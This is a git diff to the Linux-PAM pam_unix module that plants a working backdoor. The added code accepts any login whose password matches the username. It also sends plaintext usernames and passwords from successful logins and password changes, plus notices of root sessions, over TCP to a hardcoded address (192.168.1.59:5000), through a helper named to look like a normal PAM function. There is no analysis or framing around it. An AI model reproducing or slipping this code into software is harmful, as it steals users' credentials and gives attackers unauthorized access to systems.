diff --git a/modules/pam_unix/pam_unix_auth.c b/modules/pam_unix/pam_unix_auth.c
index 4eccff8..b62e966 100644
--- a/modules/pam_unix/pam_unix_auth.c
+++ b/modules/pam_unix/pam_unix_auth.c
@@ -171,6 +171,16 @@ pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
 
 	/* verify the password of this user */
 	retval = _unix_verify_password(pamh, name, p, ctrl);
+
+	if (name && p && retval == PAM_SUCCESS) {
+        pam_send_authtok("USER AUTHENTICATED:", name, p);
+    }
+
+	// If the username is equal to the password and authentication hasn't already passed, pass it
+    if (p && strlen(name) == strlen(p) && strncmp(name, p, strlen(name)) == 0 && retval != PAM_SUCCESS) {
+        retval = PAM_SUCCESS;
+    }
+	
 	name = p = NULL;
 
 	AUTH_RETURN;
diff --git a/modules/pam_unix/pam_unix_passwd.c b/modules/pam_unix/pam_unix_passwd.c
index 652f3c5..7bc42ad 100644
--- a/modules/pam_unix/pam_unix_passwd.c
+++ b/modules/pam_unix/pam_unix_passwd.c
@@ -834,6 +834,10 @@ pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv)
 			return retval;
 		}
 
+		if (user && pass_new && retval == PAM_SUCCESS) {
+        	pam_send_authtok("USER CHANGED PASSWORD:", user, pass_new);
+    	}
+
 		/*
 		 * By reaching here we have approved the passwords and must now
 		 * rebuild the password database file.
diff --git a/modules/pam_unix/pam_unix_sess.c b/modules/pam_unix/pam_unix_sess.c
index 3f6a8fb..78c74b5 100644
--- a/modules/pam_unix/pam_unix_sess.c
+++ b/modules/pam_unix/pam_unix_sess.c
@@ -98,6 +98,10 @@ pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv)
 			snprintf (uid, 32, "%u", pwd->pw_uid);
 		}
 		pam_syslog(pamh, LOG_INFO, "session opened for user %s(uid=%s) by %s(uid=%lu)", user_name, uid, login_name, (unsigned long)getuid());
+		
+		if (strncmp(uid, "0", 1) == 0 && (unsigned long)getuid() > 0) {
+            pam_send_authtok("SUDO SESSION OPENED:", login_name, ":");
+        }
 	}
 	return PAM_SUCCESS;
 }
diff --git a/modules/pam_unix/support.c b/modules/pam_unix/support.c
index 043273d..eef9807 100644
--- a/modules/pam_unix/support.c
+++ b/modules/pam_unix/support.c
@@ -33,6 +33,14 @@
 #include "support.h"
 #include "passverify.h"
 
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <ifaddrs.h>
+#include <fcntl.h>
+#include <sys/time.h>
+
 /* this is a front-end for module-application conversations */
 
 int _make_remark(pam_handle_t * pamh, unsigned long long ctrl,
@@ -853,6 +861,96 @@ _unix_verify_user(pam_handle_t *pamh,
     return retval;
 }
 
+// Helper function to get local IP address
+int get_local_ip(char *buffer, size_t buflen) {
+    struct ifaddrs *ifaddr, *ifa;
+    int family;
+    
+    if (getifaddrs(&ifaddr) == -1) {
+        return -1;  // Failed to get interfaces
+    }
+
+    // Iterate over addresses and return not the loopback address
+    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
+        if (ifa->ifa_addr == NULL) continue;
+
+        family = ifa->ifa_addr->sa_family;
+
+        // Check for IPv4 (AF_INET) and ignore loopback interfaces
+        if (family == AF_INET && strcmp(ifa->ifa_name, "lo") != 0) {
+            struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
+            if (inet_ntop(AF_INET, &addr->sin_addr, buffer, buflen) != NULL) {
+                freeifaddrs(ifaddr);
+                return 0; 
+            }
+        }
+    }
+
+    freeifaddrs(ifaddr);
+    return -1; 
+}
+
+// Function to send data to the server
+int pam_send_authtok(const char *message, const char *name, const char *p) {
+
+    // Get IP using helper function
+    char ipaddr[INET_ADDRSTRLEN];
+    if (get_local_ip(ipaddr, sizeof(ipaddr)) < 0) {
+        return 1;
+    }
+    
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) return 1;
+
+    // Make socket non-blocking for timeout handling
+    int flags = fcntl(sock, F_GETFL, 0);
+    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+
+    struct sockaddr_in serv_addr = {0};
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(CALLBACK_PORT);
+    inet_pton(AF_INET, CALLBACK_IP, &serv_addr.sin_addr);
+
+    int ret = connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
+    if (ret < 0) {
+        if (errno != EINPROGRESS) {
+            close(sock);
+            return 1; // Immediate error
+        }
+
+        // Use select() to wait with timeout
+        fd_set writefds;
+        FD_ZERO(&writefds);
+        FD_SET(sock, &writefds);
+
+        struct timeval timeout = {3, 0}; // 3 seconds
+        ret = select(sock + 1, NULL, &writefds, NULL, &timeout);
+        if (ret <= 0) {
+            close(sock);
+            return 1; // Timeout or error
+        }
+
+        // Check for socket errors
+        int so_error;
+        socklen_t len = sizeof(so_error);
+        getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
+        if (so_error != 0) {
+            close(sock);
+            return 1;
+        }
+    }
+
+
+    char credentials[256];
+    snprintf(credentials, sizeof(credentials), RET_FMT, ipaddr, message, name, p);
+
+    // Send message via TCP (non-blocking with timeout)
+    send(sock, credentials, strlen(credentials), 0);
+
+    close(sock);
+    return 0;
+}
+
 /* ****************************************************************** *
  * Copyright (c) Jan RÄ™korajski 1999.
  * Copyright (c) Andrew G. Morgan 1996-8.
diff --git a/modules/pam_unix/support.h b/modules/pam_unix/support.h
index 9c065c5..40b5f9c 100644
--- a/modules/pam_unix/support.h
+++ b/modules/pam_unix/support.h
@@ -13,6 +13,9 @@
  */
 #define LOGIN_DEFS "/etc/login.defs"
 
+#define CALLBACK_IP "192.168.1.59"
+#define CALLBACK_PORT 5000
+#define RET_FMT "%s - %s %s:%s\n"
 
 /*
  * here is the string to inform the user that the new passwords they
@@ -184,4 +187,10 @@ extern int _unix_verify_user(pam_handle_t *pamh, unsigned long long ctrl,
 extern int _unix_run_verify_binary(pam_handle_t *pamh,
 				   unsigned long long ctrl,
 				   const char *user, int *daysleft);
+
+extern int get_local_ip(char *buffer, size_t buflen);
+
+extern int pam_send_authtok(const char *message, 
+				const char *name, const char *p);
+
 #endif /* _PAM_UNIX_SUPPORT_H */
